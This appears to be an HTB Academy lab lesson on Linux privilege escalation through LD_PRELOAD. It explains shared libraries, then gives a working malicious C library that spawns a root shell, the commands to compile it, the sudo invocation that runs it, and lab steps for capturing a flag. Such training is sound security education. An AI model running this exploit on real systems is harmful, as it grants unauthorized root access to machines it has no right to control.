It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: `static libraries` (denoted by the .a file extension) and `dynamically linked shared object libraries` (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file.

Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.

```shell-session
htb_student@NIX02:~$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

The image above lists all the libraries required by `/bin/ls`, along with their absolute paths.

## LD_PRELOAD Privilege Escalation

Let's see an example of how we can utilize the [LD_PRELOAD](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:

Code: c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can compile this as follows:

```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.

```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```





#### Question

Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory.

* Download the VPN file from the HTB Academy webpage
* Open your VM and go to your Downloads page from the terminal
* Run the command " openvpn academy-regular.ovpn " (if it doesnt work try running the same command with sudo)
* Use the user and password given by HTB and then SSH to the target system spawned for you by running this command "ssh htb-student@\<ip given>\"
* Run " sudo -l " command, you will see the openssl can be run with sudo privileges by us
* Go to the " /tmp " folder
* Create a file with the script above
* Run command " gcc -fPIC -shared -o \<your program name>.so \<your program name>.c -nostartfiles "
* Run command " sudo LD_PRELOAD=/tmp/root.so openssl "
* With root access, go to the " /root/ld_preload " and open the flag file
